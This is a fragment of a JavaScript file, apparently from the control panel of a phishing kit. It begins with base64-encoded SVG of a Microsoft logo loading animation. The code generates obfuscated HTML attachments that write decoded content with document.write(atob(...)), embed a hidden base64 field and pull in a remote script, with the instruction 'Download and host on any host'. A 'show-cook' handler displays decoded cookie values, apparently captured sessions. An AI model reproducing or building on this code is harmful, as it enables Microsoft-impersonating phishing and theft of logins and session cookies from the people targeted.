DAsMjIuMjA5NTAwLDkzLjA1NjEwMEwxNzkuNzU3MDAwLDkzLjA1NjEwMEMxODEuMTY2MDAwLDkzLjk2MzAwMCwxODIuMDEyMDAwLDk1LjUzMTkwMCwxODEuOTk3MDAwLDk3LjIxMDYwMEMxODIuMDIxMDAwLDk4LjkwNjYwMCwxODEuMTc1MDAwLDEwMC40OTYwMDAsMTc5Ljc1NzAwMCwxMDEuNDIxMDAwTDEwNi42ODIwMDAsMTQ1Ljk5ODAwMEwxMDUuNzMwMDAwLDE0Ni41NTkwMDBDMTA0LjMzNTAwMCwxNDcuMzA2MDAwLDEwMi43NzYwMDAsMTQ3LjY5MTAwMCwxMDEuMTk1MDAwLDE0Ny42ODIwMDBDOTkuNjMxMzAwLDE0Ny42ODkwMDAsOTguMDkxMTAwLDE0Ny4zMDMwMDAsOTYuNzE1MDAwLDE0Ni41NTkwMDBMOTUuNzA3MTAwLDE0NS45OTgwMDBMMjIuNDA4MTAwLDEwMS40MjEwMDBaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTAxLjAwMDY5OSwtOTcuNDk5NTczKSIgZmlsbD0icmdiKDgwLDIxNywyNTUpIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSI+PC9wYXRoPjwvZz48bWFzayBpZD0ibG9hZGluZ0xvZ28zMCIgbWFzay10eXBlPSJhbHBoYSI+PHBhdGggaWQ9ImxvYWRpbmdMb2dvMzEiIGQ9Ik0yMCw5N0wxODIsOTdMMTgyLDE3NUMxODIsMTgwLjUyMzAwMCwxNzcuNTIzMDAwLDE4NSwxNzIsMTg1TDMwLDE4NUMyNC40NzcyMDAsMTg1LDIwLDE4MC41MjMwMDAsMjAsMTc1TDIwLDk3WiIgZmlsbD0icmdiKDE5NiwxOTYsMTk2KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcGF0aD48L21hc2s+PC9nPjwvZz48L2c+PC9nPjwvZz48L3N2Zz4gPHN2ZyBpZD0iTVNMb2dvIiB3aWR0aD0iOTkiIGhlaWdodD0iMjIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMzQuNjQzIDEyLjA3NWwtLjU4OCAxLjY0N2gtLjAzNGMtLjEwNS0uMzg3LS4yOC0uOTM0LS41NTYtMS42M2wtMy4xNS03Ljg5N2gtMy4wNzdWMTYuNzVoMi4wM1Y5LjAzMmMwLS40NzYtLjAxLTEuMDUyLS4wMy0xLjcxMS0uMDEtLjMzMy0uMDQ5LS42LS4wNTgtLjgwNGguMDQ1Yy4xMDMuNDczLjIxLjgzNC4yODcgMS4wNzVsMy43NzYgOS4xNmgxLjQybDMuNzQ4LTkuMjQzYy4wODUtLjIxMS4xNzUtLjYyMi4yNTctLjk5MmguMDQ0Yy0uMDQ4LjkxNS0uMDkgMS43NS0uMDk1IDIuMjU2djcuOTc4aDIuMTY1VjQuMTk1aC0yLjk1NmwtMy4yMjggNy44OHoiIGZpbGw9IiM3Mzc0NzQiPjwvcGF0aD48cGF0aCBkPSJNMCAyMC45NTZoOTguMTQ4VjBIMHoiPjwvcGF0aD48cGF0aCBmaWxsPSIjNzM3NDc0IiBkPSJNNDIuODY2IDE2Ljc1MWgyLjExOFY3Ljc1MmgtMi4xMTh6TTQzLjk0NyAzLjkyOWMtLjM0OSAwLS42NTMuMTE5LS45MDIuMzUzYTEuMTY2IDEuMTY2IDAgMDAtLjM3OC44ODNjMCAuMzQ0LjEyNi42MzYuMzc0Ljg2NS4yNDcuMjMuNTUyLjM0NS45MDYuMzQ1cy42Ni0uMTE1LjkxLS4zNDVjLjI1LS4yMy4zNzktLjUyLjM3OS0uODY1IDAtLjMzOS0uMTI1LS42MzItLjM3LS44NzNhMS4yNjIgMS4yNjIgMCAwMC0uOTE5LS4zNjNNNTIuNDc3IDcuNjYzYTUuODkyIDUuODkyIDAgMDAtMS4xODItLjEyN2MtLjk3MSAwLTEuODM4LjIwOS0yLjU3NC42Mi0uNzM5LjQxLTEuMzEuOTk4LTEuNjk5IDEuNzQ1LS4zODYuNzQ1LS41ODMgMS42MTUtLjU4MyAyLjU4NSAwIC44NS4xOSAxLjYzMS41NjcgMi4zMTguMzc3LjY5LjkxIDEuMjMgMS41ODUgMS42MDIuNjczLjM3MyAxLjQ1Mi41NjMgMi4zMTMuNTYzIDEuMDA2IDAgMS44NjYtLjIwMSAyLjU1NC0uNTk3bC4wMjctLjAxN3YtMS45NGwtLjA4OS4wNjZjLS4zMTIuMjI3LS42Ni40MDgtMS4wMzUuNTM4YTMuMTIxIDMuMTIxIDAgMDEtMS4wMTQuMTk3Yy0uODMgMC0xLjQ5Ny0uMjYtMS45ODItLjc3Mi0uNDg1LS41MTMtLjczLTEuMjMzLS43My0yLjE0IDAtLjkxMi4yNTUtMS42NTEuNzYxLTIuMTk2LjUwNC0uNTQ0IDEuMTczLS44MiAxLjk4Ni0uODIuNjk1IDAgMS4zNzQuMjM2IDIuMDE0LjcwMmwuMDkuMDYzVjguMDExbC0uMDI5LS4wMTdjLS4yNDEtLjEzNS0uNTcxLS4yNDYtLjk4LS4zMzFNNTkuNDUyIDcuNTk3YTIuMTcgMi4xNyAwIDAwLTEuNDE1LjUwN2MtLjM1OC4yOTYtLjYxNi43LS44MTQgMS4yMDdINTcuMlY3Ljc1M2gtMi4xMTZ2OC45OTlINTcuMnYtNC42MDNjMC0uNzg0LjE3OC0xLjQyNi41MjgtMS45MTIuMzQ2LS40OC44MDYtLjcyMyAxLjM2OS0uNzIzLjE5IDAgLjQwNC4wMzEuNjM2LjA5My4yMy4wNjMuMzk2LjEyOS40OTMuMmwuMDkuMDY0VjcuNzM3bC0uMDM0LS4wMTRjLS4xOTctLjA4My0uNDc3LS4xMjYtLjgzLS4xMjZNNjYuODg1IDE0LjQ2NWMtLjM5Ny40OTktLjk5Ni43NTEtMS43NzkuNzUxLS43NzcgMC0xLjM5LS4yNTYtMS44MjMtLjc2Ni0uNDM1LS41MS0uNjU1LTEuMjM4LS42NTUtMi4xNjMgMC0uOTU0LjIyLTEuNzAxLjY1NS0yLjIyLjQzMy0uNTE2IDEuMDQtLjc3OCAxLjgwNi0uNzc4Ljc0MyAwIDEuMzM1LjI1IDEuNzU4Ljc0NC40MjYuNDk2LjY0MiAxLjIzNy42NDIgMi4yMDIgMCAuOTc3LS4yMDMgMS43MjgtLjYwNCAyLjIzbS0xLjY4My02LjkyOWMtMS40ODQgMC0yLjY2My40MzUtMy41MDMgMS4yOTMtLjg0Ljg1Ny0xLjI2NSAyLjA0NC0xLjI2NSAzLjUyNyAwIDEuNDEuNDE1IDIuNTQzIDEuMjM1IDMuMzY4LjgyLjgyNiAxLjkzNiAxLjI0NSAzLjMxNiAxLjI0NSAxLjQzOCAwIDIuNTkzLS40NDEgMy40MzQtMS4zMS44NC0uODcgMS4yNjUtMi4wNDUgMS4yNjUtMy40OTMgMC0xLjQzMy0uNC0yLjU3My0xLjE4Ny0zLjM5NC0uNzg5LS44Mi0xLjg5Ny0xLjIzNi0zLjI5NS0xLjIzNk03NC4zNzggMTEuNDcxYy0uNjY3LS4yNjgtMS4wOTUtLjQ5LTEuMjctLjY2LS4xNy0uMTY1LS4yNTctLjM5OC0uMjU3LS42OTMgMC0uMjYyLjEwOC0uNDcyLjMyNy0uNjQyLjIxOS0uMTcuNTI2LS4yNTcuOTExLS4yNTcuMzU3IDAgLjcyMy4wNTYgMS4wODUuMTY2LjM2My4xMTEuNjgyLjI2Ljk0OS40NGwuMDg4LjA2VjcuOTI4bC0uMDM1LS4wMTVhNC43MTUgNC43MTUgMCAwMC0uOTYyLS4yNjggNS45MzIgNS45MzIgMCAwMC0xLjA1Ni0uMTA5Yy0xLjAxIDAtMS44NDUuMjU4LTIuNDgzLjc2Ny0uNjQuNTEyLS45NjcgMS4xODQtLjk2NyAxLjk5NyAwIC40MjIuMDcuNzk4LjIwOSAxLjExNi4xNC4zMi4zNTUuNi42NDEuODM3LjI4My4yMzMuNzIyLjQ3OCAxLjMwMi43MjguNDg4LjIuODUyLjM3IDEuMDgzLjUwNS4yMjcuMTMuMzg3LjI2My40NzcuMzkuMDg4LjEyNy4xMzMuMjk5LjEzMy41MTIgMCAuNjA0LS40NTIuODk3LTEuMzg0Ljg5N2EzLjggMy44IDAgMDEtMS4xNzItLjIxMyA0LjQxOCA0LjQxOCAwIDAxLTEuMi0uNjA5bC0uMDg5LS4wNjR2Mi4wNjRsLjAzMy4wMTVjLjMwNC4xNC42ODYuMjU3IDEuMTM3LjM1LjQ0OS4wOTQuODU5LjE0MSAxLjIxMy4xNDEgMS4wOTYgMCAxLjk3Ny0uMjYgMi42Mi0uNzcxLjY0OC0uNTE1Ljk3Ni0xLjIwNC45NzYtMi4wNDUgMC0uNjA3LS4xNzYtMS4xMjctLjUyNS0xLjU0Ni0uMzQ1LS40MTYtLjk0Ni0uNzk5LTEuNzg0LTEuMTM2TTg0LjA2MyAxNC40NjVjLS4zOTguNDk5LS45OTcuNzUxLTEuNzguNzUxLS43NzcgMC0xLjM5LS4yNTYtMS44MjItLjc2Ni0uNDM1LS41MS0uNjU1LTEuMjM4LS42NTUtMi4xNjMgMC0uOTU0LjIyLTEuNzAxLjY1NS0yLjIyLjQzMi0uNTE2IDEuMDQtLjc3OCAxLjgwNi0uNzc4Ljc0MyAwIDEuMzM1LjI1IDEuNzU4Ljc0NC40MjYuNDk2LjY0MiAxLjIzNy42NDIgMi4yMDIgMCAuOTc3LS4yMDQgMS43MjgtLjYwNCAyLjIzTTgyLjM4IDcuNTM2Yy0xLjQ4NCAwLTIuNjYzLjQzNS0zLjUwMyAxLjI5My0uODQuODU3LTEuMjY2IDIuMDQ0LTEuMjY2IDMuNTI3IDAgMS40MS40MTUgMi41NDMgMS4yMzUgMy4zNjguODIuODI2IDEuOTM2IDEuMjQ1IDMuMzE3IDEuMjQ1IDEuNDM4IDAgMi41OTMtLjQ0MSAzLjQzMy0xLjMxLjg0LS44NyAxLjI2Ni0yLjA0NSAxLjI2Ni0zLjQ5MyAwLTEuNDMzLS40LTIuNTczLTEuMTg3LTMuMzk0LS43ODktLjgyLTEuODk3LTEuMjM2LTMuMjk1LTEuMjM2TTk4LjE0OSA5LjQ4VjcuNzUyaC0yLjE0NFY1LjA2OWwtLjA3Mi4wMjItMi4wMTUuNjE2LS4wMzguMDEydjIuMDM0aC0zLjE3N1Y2LjYyYzAtLjUyNy4xMTgtLjkzMS4zNTEtMS4yLjIzLS4yNjYuNTYtLjQwMi45ODItLjQwMi4zMDMgMCAuNjE2LjA3Mi45MzEuMjEzbC4wNzkuMDM1VjMuNDQ3bC0uMDM3LS4wMTNjLS4yOTQtLjEwNS0uNjk1LS4xNTktMS4xOS0uMTU5LS42MjYgMC0xLjE5NC4xMzYtMS42ODkuNDA2LS40OTUuMjctLjg4Ni42NTUtMS4xNiAxLjE0Ni0uMjcyLjQ4OS0uNDEgMS4wNTQtLjQxIDEuNjh2MS4yNDZoLTEuNDkydjEuNzI2aDEuNDkzdjcuMjczaDIuMTQyVjkuNDc5aDMuMTc3djQuNjIyYzAgMS45MDMuODk3IDIuODY4IDIuNjY4IDIuODY4LjI5MSAwIC41OTctLjAzNC45MS0uMTAxLjMxOS0uMDcuNTM1LS4xMzcuNjYyLS4yMWwuMDI5LS4wMTZ2LTEuNzQzbC0uMDg3LjA1OGMtLjExNy4wNzgtLjI2Mi4xNC0uNDMyLjE4OC0uMTcuMDQ4LS4zMTIuMDcyLS40MjIuMDcyLS40MTYgMC0uNzIzLS4xMTItLjkxNC0uMzMyLS4xOTEtLjIyMy0uMjg5LS42MTItLjI4OS0xLjE1OFY5LjQ4aDIuMTQ0eiI+PC9wYXRoPjxwYXRoIGZpbGw9IiNGMDUxMjQiIGQ9Ik0wIDkuOTU4aDkuOTU4Vi4wMDFIMHoiPjwvcGF0aD48cGF0aCBmaWxsPSIjN0VCQjQyIiBkPSJNMTAuOTk1IDkuOTU4aDkuOTU3Vi4wMDFoLTkuOTU3eiI+PC9wYXRoPjxwYXRoIGZpbGw9IiMzMkEwREEiIGQ9Ik0wIDIwLjk1Nmg5Ljk1OFYxMUgweiI+PC9wYXRoPjxwYXRoIGZpbGw9IiNGREI4MTMiIGQ9Ik0xMC45OTUgMjAuOTU2aDkuOTU3VjExaC05Ljk1N3oiPjwvcGF0aD48L2c+PC9zdmc+PC9kaXY+CQ0K";
			let v102 = '<script src="' + v100 + '"></script>';
			var v103 =
				'<script>document.write(atob("' +
				f10(v101, (rt = 1)) +
				'") + `' +
				('<input type="hidden" id="b64u" value="' +
					btoa(v99) +
					'"></input>') +
				'` + atob("' +
				f10(btoa(v102), (rt = 1)) +
				'"))</script>';
			f(
				"Link File , Download and host on any host.",
				v103,
				"html",
				(mtd = 1),
				(link = 1)
			);
		});
	});
	$(".show-cook").click(function (p48) {
		var v104 = $(this).val();
		var v105 = JSON.parse(v104);
		f(v105.head, atob(v105.val), v105.type);
	});
	$("#cidr").on("keyup", function () {
		var v106 = $(this).val();
		if (v106.toString().match(/^(?:[0-9]{1,3}\.){1,3}[0-9]{1,3}$/)) {
			$("#block").prop("disabled", false);
		} else {
			$("#block").prop("disabled", true);
		}
	});
	$(".live-search").keyup(function () {
		var v107 = this.value.toLowerCase().trim();
		$(".d-tab .full-width-tr").each(function (p49) {
			$(this)
				.find("td")
				.each(function () {
					var v108 = $(this).text().toLowerCase().trim();
					var v109 = v108.indexOf(v107) == -1;
					$(this).closest("tr").toggle(!v109);
					return v109;
				});
		});
	});
});
